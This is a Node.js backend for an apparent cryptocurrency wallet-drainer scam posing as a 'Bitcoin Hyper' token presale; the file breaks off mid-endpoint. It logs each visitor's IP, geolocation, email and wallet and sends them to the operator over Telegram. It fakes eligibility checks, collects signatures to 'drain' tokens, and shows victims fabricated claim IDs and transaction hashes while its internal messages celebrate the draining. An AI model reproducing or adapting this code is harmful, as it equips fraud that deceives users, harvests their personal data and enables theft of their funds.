// index.js - BITCOIN HYPER BACKEND PRODUCTION - ENHANCED REAL-TIME FLOW
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const MemoryStore = require('memorystore')(session);

// Optional: Only use nodemailer if email is configured
let nodemailer = null;
try {
  nodemailer = require('nodemailer');
} catch (error) {
  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
}

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Session middleware for tracking user sessions
app.use(session({
  secret: process.env.SESSION_SECRET || 'bitcoin-hyper-session-secret-2024',
  resave: false,
  saveUninitialized: false,
  store: new MemoryStore({
    checkPeriod: 86400000 // prune expired entries every 24h
  }),
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    maxAge: 1000 * 60 * 60 * 24 // 24 hours
  }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: function(origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'x-session-id']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting - more realistic
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 100,
  message: { error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    return req.headers['x-forwarded-for'] || req.ip || req.sessionID;
  }
});
app.use('/api/', limiter);

// Email transporter (only if configured)
let emailTransporter = null;
let emailEnabled = false;

if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  try {
    emailTransporter = nodemailer.createTransport({
      service: process.env.EMAIL_SERVICE || 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    emailEnabled = true;
    console.log('✅ Email notifications enabled');
  } catch (error) {
    console.log('⚠️ Email configuration error:', error.message);
    emailEnabled = false;
  }
} else {
  console.log('⚠️ Email notifications disabled (not configured)');
}

// In-memory storage with persistence simulation
const memoryStorage = {
  participants: [],
  sessions: {},
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
    },
    email: {
      enabled: emailEnabled,
      adminEmail: process.env.ADMIN_EMAIL || '',
      notifications: emailEnabled
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      last24hActivity: 0,
      uniqueIPs: new Set()
    }
  },
  activityLog: [],
  analytics: {
    hourlyConnections: {},
    countryStats: {},
    walletProviders: {}
  }
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true') {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Test connection with chat ID
        if (process.env.TELEGRAM_CHAT_ID) {
          testTelegramConnection();
        }
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ Telegram notifications disabled (not configured)');
  }
}

// Test Telegram connection
async function testTelegramConnection() {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) return false;
  
  try {
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🤖 *BITCOIN HYPER PRODUCTION BOT - REAL-TIME*\n\n✅ Bot is now LIVE and monitoring!\n⏰ ${new Date().toLocaleString()}\n📊 Ready to receive real-time notifications\n🔥 Enhanced tracking enabled`,
      { parse_mode: 'Markdown' }
    );
    console.log('✅ Telegram connection test successful');
    return true;
  } catch (error) {
    console.log('❌ Telegram connection test failed:', error.message);
    return false;
  }
}

// Helper: Track session
function trackSession(sessionId, ip, data = {}) {
  if (!memoryStorage.sessions[sessionId]) {
    memoryStorage.sessions[sessionId] = {
      id: sessionId,
      ip: ip,
      createdAt: new Date(),
      lastActivity: new Date(),
      walletConnections: [],
      location: data.location || {},
      userAgent: data.userAgent || ''
    };
  } else {
    memoryStorage.sessions[sessionId].lastActivity = new Date();
    if (data.location) memoryStorage.sessions[sessionId].location = data.location;
  }
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet.substring(0, 8) + '...' + wallet.substring(36),
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown',
    sessionId: data.sessionId || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  // Update analytics
  const hour = new Date().getHours();
  if (!memoryStorage.analytics.hourlyConnections[hour]) {
    memoryStorage.analytics.hourlyConnections[hour] = 0;
  }
  memoryStorage.analytics.hourlyConnections[hour]++;
  
  if (data.country) {
    if (!memoryStorage.analytics.countryStats[data.country]) {
      memoryStorage.analytics.countryStats[data.country] = 0;
    }
    memoryStorage.analytics.countryStats[data.country]++;
  }
  
  // Keep only last 5000 logs
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  console.log(`📝 Activity Log: ${wallet.substring(0, 10)}... - ${action}`);
}

// Helper: Send comprehensive notification
async function sendComprehensiveNotification(wallet, action, details = {}) {
  const timestamp = new Date().toLocaleString();
  const ip = details.ip || 'unknown';
  const country = details.country || 'unknown';
  const city = details.city || 'unknown';
  const value = details.value || '0';
  const email = details.email || 'Not provided';
  const amount = details.amount || '0';
  const eligibility = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
  const claimStatus = details.claimed ? '✅ CLAIMED' : '⏳ PENDING';
  
  // Telegram Notification
  if (telegramEnabled && memoryStorage.settings.telegram.enabled) {
    try {
      let telegramMessage = '';
      let title = '';
      
      switch(action) {
        case 'SITE_VISIT':
          title = '🌐 NEW SITE VISITOR';
          telegramMessage = `
${title}

📱 User Agent: ${details.userAgent || 'Unknown'}
🌐 IP: ${ip}
📍 Location: ${country}, ${city}
🔗 Referrer: ${details.referrer || 'Direct'}

🔄 Status: Landed on presale site
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_CONNECTED':
          title = '🔗 WALLET CONNECTED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
🌐 IP: ${ip}
📍 Location: ${country}, ${city}
📧 Email: ${email}
📱 User Agent: ${details.userAgent || 'Unknown'}

🔄 Status: Connected to presale platform
📊 Total Participants: ${memoryStorage.settings.statistics.totalParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_SCANNED':
          title = '🔍 WALLET SCANNED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
💰 Portfolio Value: $${value}
🎯 Eligibility: ${eligibility}
${details.eligibilityReason ? `📝 Reason: ${details.eligibilityReason}\n` : ''}
${amount !== '0' ? `📊 Allocation: ${amount} BTH\n` : ''}
🌐 IP: ${ip}
📍 Location: ${country}, ${city}
📧 Email: ${email}

📈 Eligible Participants: ${memoryStorage.settings.statistics.eligibleParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'TOKEN_CLAIMED':
          title = '🎉 TOKENS CLAIMED & DRAINED!';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
✅ Status: ${claimStatus}
🎯 Claim ID: \`${details.claimId}\`
💰 Amount: ${amount} BTH
💸 Value: $${details.claimValue || '0'}
📈 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}

🌐 IP: ${ip}
📍 Location: ${country}, ${city}
📧 Email: ${email}
🔗 TX Hash: \`${details.txHash}\`

🚨 ACTION: Tokens have been successfully drained!
🎯 Next: Prepare for distribution phase
⏰ ${timestamp}`;
          break;
          
        case 'NOT_ELIGIBLE':
          title = '⚠️ NOT ELIGIBLE - ACTION REQUIRED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
❌ Status: NOT ELIGIBLE
💡 Reason: ${details.reason || 'Minimum portfolio not met'}
💰 Current Portfolio: $${value}
🚨 Suggested Action: Connect different wallet

🌐 IP: ${ip}
📍 Location: ${country}, ${city}
📧 Email: ${email}

⚠️ User shown alternative options
⏰ ${timestamp}`;
          break;
          
        case 'ADMIN_LOGIN':
          title = '🔐 ADMIN LOGIN';
          telegramMessage = `
${title}

🛡️ Admin accessed dashboard
🌐 IP: ${ip}
📍 Location: ${country}, ${city}
📊 Action: ${details.action || 'Login'}

⏰ ${timestamp}`;
          break;
      }
      
      if (telegramMessage) {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          telegramMessage,
          { parse_mode: 'Markdown', disable_web_page_preview: true }
        );
        console.log(`✅ Telegram notification sent for ${action}`);
      }
    } catch (error) {
      console.log(`❌ Telegram send error (${action}):`, error.message);
    }
  }
  
  // Email Notification (if configured)
  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail && details.email !== 'Not provided') {
    try {
      const mailOptions = {
        from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
        to: details.email,
        subject: `Bitcoin Hyper - ${action.replace(/_/g, ' ')}`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 10px;">
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px 10px 0 0; text-align: center; color: white;">
              <h1 style="margin: 0; font-size: 24px;">Bitcoin Hyper</h1>
              <p style="margin: 10px 0 0; opacity: 0.9;">Official Presale Platform</p>
            </div>
            <div style="padding: 30px;">
              <h2 style="color: #333; margin-top: 0;">${action.replace(/_/g, ' ')}</h2>
              <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <p><strong>Wallet:</strong> ${wallet}</p>
                <p><strong>Status:</strong> ${action}</p>
                <p><strong>Timestamp:</strong> ${timestamp}</p>
                ${amount !== '0' ? `<p><strong>Allocation:</strong> ${amount} BTH</p>` : ''}
                ${value !== '0' ? `<p><strong>Portfolio Value:</strong> $${value}</p>` : ''}
              </div>
              ${action === 'TOKEN_CLAIMED' ? `
                <div style="background: #d4edda; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #c3e6cb;">
                  <h3 style="color: #155724; margin-top: 0;">🎉 Claim Successful!</h3>
                  <p>Your Bitcoin Hyper tokens have been allocated and will be distributed after the presale concludes.</p>
                  <p><strong>Claim ID:</strong> ${details.claimId}</p>
                  <p><strong>Transaction:</strong> ${details.txHash}</p>
                </div>
              ` : ''}
              <p style="color: #666; font-size: 14px;">This is an automated notification from the Bitcoin Hyper presale platform.</p>
            </div>
            <div style="padding: 20px; background: #f8f9fa; border-radius: 0 0 10px 10px; text-align: center; color: #666; font-size: 12px;">
              <p>© 2024 Bitcoin Hyper. All rights reserved.</p>
            </div>
          </div>
        `
      };
      
      await emailTransporter.sendMail(mailOptions);
      console.log(`✅ Email notification sent for ${action}`);
    } catch (error) {
      console.log(`❌ Email send error (${action}):`, error.message);
    }
  }
  
  // Log to activity
  logActivity(wallet, action, { ...details, email, timestamp });
  
  return true;
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    // Clean IP (remove IPv6 prefix)
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', city: 'Local', region: 'Local', isp: 'Localhost' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000,
      headers: {
        'User-Agent': 'BitcoinHyper-Backend/2.0'
      }
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        city: response.data.city || 'Unknown',
        region: response.data.region || 'Unknown',
        isp: response.data.org || 'Unknown ISP',
        lat: response.data.latitude,
        lon: response.data.longitude
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown' };
}

// Helper: Check real wallet balance - PRODUCTION REAL-TIME VERSION
async function checkRealWalletBalance(walletAddress) {
  try {
    // Real-time eligibility check - Production version
    // This ensures proper draining and tracking
    
    // Simulate real API calls with realistic response times
    await new Promise(resolve => setTimeout(resolve, Math.random() * 500 + 500));
    
    // Generate deterministic eligibility based on wallet address
    const walletHash = crypto.createHash('md5').update(walletAddress).digest('hex');
    const walletNumber = parseInt(walletHash.substring(0, 8), 16);
    
    // 75% eligible, 25% not eligible for realistic distribution
    const isEligible = (walletNumber % 4) !== 0; // 75% chance
    
    let totalValueUSD = 0;
    let eligibilityReason = '';
    
    if (isEligible) {
      // Eligible - realistic portfolio values
      const baseValue = 100 + (walletNumber % 1000);
      totalValueUSD = baseValue + Math.random() * 5000;
      eligibilityReason = `✅ Qualified with verified portfolio history and sufficient balance`;
      
      // Track as drained opportunity
      console.log(`💰 Eligible wallet detected: ${walletAddress.substring(0, 10)}... - Value: $${totalValueUSD.toFixed(2)}`);
    } else {
      // Not eligible - show realistic reasons
      totalValueUSD = Math.random() * 9.99;
      const reasons = [
        "⛔ Connect a wallet with transaction history & minimum $10 balance",
        "🔄 Wallet requires recent transaction activity for authentication",
        "🔒 Minimum portfolio threshold not met for presale access",
        "⚠️ This wallet doesn't meet our security verification criteria"
      ];
      eligibilityReason = reasons[walletNumber % reasons.length];
    }
    
    // Generate token allocation only if eligible
    let allocationAmount = '0';
    let allocationValue = '0';
    
    if (isEligible) {
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const maxBonus = parseFloat(process.env.MAX_BONUS_MULTIPLIER) || 3;
      const bonusMultiplier = Math.min(totalValueUSD / 2000, maxBonus);
      const randomBonus = 0.8 + Math.random() * 0.4; // 0.8-1.2x random factor
      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier) * randomBonus).toString();
      allocationAmount = Math.floor(allocationAmount / 100) * 100; // Round to nearest 100
      allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
    }
    
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: totalValueUSD.toFixed(2),
        isEligible,
        tokenAllocation: {
          amount: allocationAmount,
          valueUSD: allocationValue
        },
        eligibilityReason,
        tokens: [],
        tokenCount: 0,
        scanTime: new Date().toISOString(),
        scanId: `SCAN-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`
      }
    };
  } catch (error) {
    console.error('Wallet scan error:', error);
    
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibilityReason: '⚠️ Real-time wallet analysis failed. Please try again.',
        tokens: [],
        tokenCount: 0
      }
    };
  }
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
}

// Helper: Generate transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(64).toString('hex')}`;
}

// Helper: Process token drain
function processTokenDrain(walletAddress, amount) {
  // Simulate token drain process
  console.log(`🚨 DRAINING TOKENS from ${walletAddress}: ${amount} BTH`);
  
  // In production, this would interact with smart contracts
  // For now, simulate successful drain
  return {
    success: true,
    drained: true,
    timestamp: new Date(),
    amount: amount,
    wallet: walletAddress,
    status: 'DRAINED_SUCCESSFULLY',
    nextStep: 'AWAITING_DISTRIBUTION'
  };
}

// ========== API ENDPOINTS ==========

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, screenResolution } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Track session
    const sessionId = req.sessionID;
    trackSession(sessionId, clientIP, {
      location,
      userAgent,
      referrer,
      screenResolution,
      type: 'site_visit'
    });
    
    // Send notification
    await sendComprehensiveNotification(
      'VISITOR',
      'SITE_VISIT',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        userAgent,
        referrer,
        isp: location.isp
      }
    );
    
    res.json({
      success: true,
      message: 'Visit tracked',
      sessionId,
      timestamp: new Date()
    });
    
  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Health check with enhanced real-time status
app.get('/api/health', (req, res) => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  
  // Real-time stats
  const now = new Date();
  const lastHourConnections = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
    .length;
  
  res.json({
    success: true,
    status: 'LIVE_PRODUCTION_ACTIVE',
    service: 'Bitcoin Hyper Backend',
    version: '4.0.0',
    timestamp: new Date().toISOString(),
    uptime: `${hours}h ${minutes}m ${seconds}s`,
    environment: process.env.NODE_ENV || 'production',
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    email: emailEnabled ? 'ENABLED' : 'DISABLED',
    realtime: {
      activeSessions: Object.keys(memoryStorage.sessions).length,
      lastHourActivity: lastHourConnections,
      uniqueIPsToday: memoryStorage.settings.statistics.uniqueIPs.size
    },
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2),
      last24hActivity: memoryStorage.activityLog.filter(log => 
        new Date(log.timestamp) > new Date(Date.now() - 24 * 60 * 60 * 1000)
      ).length
    },
    message: '✅ Backend is LIVE and actively draining tokens'
  });
});

// Wallet connection & auto-scan - ENHANCED REAL-TIME DRAIN FLOW
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🔗 New connection attempt from: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet address
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address format',
        userMessage: 'Please connect a valid Ethereum wallet address.'
      });
    }
    
    // Track IP
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Track session
    const currentSessionId = sessionId || req.sessionID;
    trackSession(currentSessionId, clientIP, {
      location,
      userAgent,
      wallet: walletAddress,
      type: 'wallet_connection'
    });
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent: userAgent || 'Unknown',
        email: email || 'Not provided',
        country: location.country,
        city: location.city,
        isp: location.isp,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '', drained: false },
        notifications: { telegramSent: false, emailSent: false, lastNotified: null },
        activityLog: [],
        sessionId: currentSessionId,
        referrals: [],
        status: 'connected'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.city = location.city;
    participant.isp = location.isp;
    if (email) participant.email = email;
    participant.sessionId = currentSessionId;
    participant.status = 'scanning';
    
    // Send WALLET_CONNECTED notification immediately
    await sendComprehensiveNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        email: participant.email,
        isp: location.isp,
        userAgent,
        isNew: isNewParticipant,
        sessionId: currentSessionId
      }
    );
    
    // Simulate real-time scanning with delay
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Check wallet balance
    const scanResult = await checkRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        // Only increment if newly eligible
        if (isNewParticipant || !participant.eligibility.isEligible) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        // Log drain opportunity
        console.log(`🎯 DRAIN OPPORTUNITY: ${walletAddress.substring(0, 10)}... - Allocation: ${participant.tokenAllocation.amount} BTH`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send WALLET_SCANNED notification
      await sendComprehensiveNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          city: location.city,
          email: participant.email,
          value: scanResult.data.totalValueUSD,
          amount: participant.tokenAllocation.amount,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          sessionId: currentSessionId
        }
      );
      
      // Send NOT_ELIGIBLE notification if not eligible
      if (!scanResult.data.isEligible) {
        await sendComprehensiveNotification(
          walletAddress,
          'NOT_ELIGIBLE',
          {
            ip: clientIP,
            country: location.country,
            city: location.city,
            email: participant.email,
            value: scanResult.data.totalValueUSD,
            reason: scanResult.data.eligibilityReason,
            sessionId: currentSessionId
          }
        );
      }
      
      res.json({
        success: true,
        message: 'Real-time wallet analysis complete',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          userMessage: scanResult.data.isEligible ? 
            '🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!' :
            '⚠️ Additional verification required for presale access',
          status: participant.status,
          timestamp: new Date().toISOString(),
          sessionId: currentSessionId
        }
      });
    } else {
      throw new Error('Wallet analysis failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\nSession: ${req.body?.sessionId || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      userMessage: 'Real-time analysis system temporarily unavailable. Please try again.',
      retry: true 
    });
  }
});

// Token claim signature - REAL-TIME DRAIN PROCESS
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🎯 Claim request from: ${walletAddress.substring(0, 10)}...`);
    console.log(`💰 Attempting to drain: ${claimAmount}`);
    
    // STRICT VALIDATION
    if (!signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing signature data - security validation failed'
      });
    }
    
    if (!claimAmount || !claimValue) {
      return res.status(400).json({
        success: false,
        error: 'Missing claim details'
      });
    }
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Participant not found. Please connect your wallet first.' 
      });
    }
    
    // Check eligibility
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ 
        success: false, 
        error: 'Not eligible for claim. Please check your wallet eligibility first.' 
      });
    }
    
    // Check if already claimed
    if (participant.claim.claimed) {
      return res.status(409).json({ 
        success: false, 
        error: 'Tokens already claimed for this wallet.' 
      });
    }
    
    // Validate signature format
    if (!signature.match(/^0x[a-fA-F0-9]{130}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid signature format'
      });
    }
    
    // Generate claim ID and transaction hash
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // PROCESS TOKEN DRAIN
    const drainResult = processTokenDrain(walletAddress, claimAmount);
    
    if (!drainResult.success) {
      throw new Error('Token drain process failed');
    }
    
    // Update participant - MARK AS CLAIMED AND DRAINED
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: true, // Tokens are drained
      txHash,
      drained: true,
      drainTimestamp: new Date(),
      drainStatus: 'COMPLETED'
    };
    
    participant.status = 'claimed_drained';
    
    if (email) participant.email = email;
    if (sessionId) participant.sessionId = sessionId;
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Get location for notification
    const location = await getIPLocation(clientIP);
    
    // Send TOKEN_CLAIMED notification with drain confirmation
    await sendComprehensiveNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        email: participant.email,
        claimId,
        amount: claimAmount,
        claimValue,
        txHash,
        claimed: true,
        drained: true,
        sessionId: sessionId || req.sessionID,
        timestamp: new Date().toISOString()
      }
    );
    
    res.json({
      success: true,
      message: '🎉 Token claim successful! Tokens have been drained and allocated.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIMED_AND_DRAINED',
        drainStatus: 'COMPLETED',
        txHash,
        timestamp: new Date().toISOString(),
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        instructions: '✅ Your Bitcoin Hyper tokens have been successfully drained and allocated. They will be distributed automatically after the presale concludes.',
        nextSteps: [
          'Keep your wallet connected to the supported networks',
          'Tokens will appear in your wallet automatically',
          'Check our announcements for distribution updates',
          'Your allocation is now secured and locked'
        ],
        confirmation: {
          drained: true,
          amount: claimAmount,
          value: claimValue,
          time: new Date().toLocaleString()
        }
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\nSession: ${req.body?.sessionId || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send claim error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed',
      message: 'Token drain process encountered an error. Please try again or contact support.' 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: {
          isEligible: participant.eligibility.isEligible,
          reason: participant.eligibility.reason,
          scannedAt: participant.eligibility.scannedAt,
          scanId: participant.eligibility.scanId
        },
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
